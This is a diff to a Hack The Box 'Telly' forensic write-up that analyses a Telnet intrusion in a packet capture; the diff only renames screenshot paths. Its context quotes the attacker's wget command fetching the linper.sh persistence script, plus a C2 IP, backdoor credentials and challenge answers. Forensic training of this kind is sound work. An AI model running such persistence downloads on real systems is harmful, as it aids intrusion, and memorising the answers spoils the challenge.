@@ -27,7 +27,7 @@
 
 ### Extracting the Artifact
 
-![Telly zip contents](screenshots/unzipped_telly.png)
+![Telly zip contents](Screenshots/unzipped telly.png)
 
 Download `Telly.zip` from the HTB Sherlock page, then extract it 
 using the HTB-provided password:
@@ -43,7 +43,7 @@ Open the PCAP in Wireshark:
 wireshark Telly/monitoringservice_export_202610AM-11AM.pcapng
 ```
 
-![Wireshark opened](screenshots/Telly_1.png)
+![Wireshark opened](Screenshots/Telly 1.png)
 
 ---
 
@@ -56,7 +56,7 @@ in the Telnet protocol?**
 
 **Answer: `CVE-2026-24061`**
 
-![Task 1](screenshots/Task_1.png)
+![Task 1](Screenshots/Task 1.png)
 
 Filter for Telnet traffic in Wireshark: 
 tcp.port == 23
@@ -82,7 +82,7 @@ granting the attacker remote root access?**
 
 **Answer: `2026-01-27 10:39:28`**
 
-![Task 2](screenshots/Task_2.png)
+![Task 2](Screenshots/Task 2.png)
 
 Following TCP Stream 14, the Ubuntu MOTD banner confirms the 
 moment the root shell was granted:
@@ -99,7 +99,7 @@ marks the exact moment the attacker gained root access.
 
 **Answer: `backup-secondary`**
 
-![Task 3](screenshots/Task_3.png)
+![Task 3](Screenshots/Task 3.png)
 
 The hostname appears in two places within the TCP stream:
 
@@ -115,7 +115,7 @@ access. What username and password were set for that account?**
 
 **Answer: `cleanupsvc:YouKnowWhoiam69`**
 
-![Task 4](screenshots/Question_4.png)
+![Task 4](Screenshots/Question 4.png)
 
 Still within TCP Stream 14, the attacker ran the following command:
 
@@ -147,7 +147,7 @@ the persistence script?**
 **Answer:**
 wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
 
-![Task 5](screenshots/Question_5.png)
+![Task 5](Screenshots/Question 5.png)
 
 After establishing the backdoor account, the attacker downloaded 
 the open-source Linux persistence framework **linper.sh** from 
@@ -166,7 +166,7 @@ the persistence script. What is the C2 IP address?**
 
 **Answer: `91.99.25.54`**
 
-![Task 6](screenshots/Task_6.png)
+![Task 6](Screenshots/Task 6.png)
 
 The attacker ran linper.sh with the C2 IP and port as arguments:
 
@@ -198,9 +198,9 @@ At what time was this file exfiltrated?**
 
 **Answer: `2026-01-27 10:49:54`**
 
-![Task 7](screenshots/Task_7.png)
+![Task 7](Screenshots/Task 7.png)
 
-![Wireshark port 6932](screenshots/Wireshark.png)
+![Wireshark port 6932](Screenshots/Wireshark.png)
 
 After establishing persistence, the attacker navigated to `/opt` 
 and found a sensitive database:
@@ -228,7 +228,7 @@ Quinn Harris.**
 
 **Answer: `5312269047781209`**
 
-![Task 8](screenshots/Last_question.png)
+![Task 8](Screenshots/Last question.png)
 
 The database was carved from the PCAP via 
 **File → Export Objects → HTTP** in Wireshark.
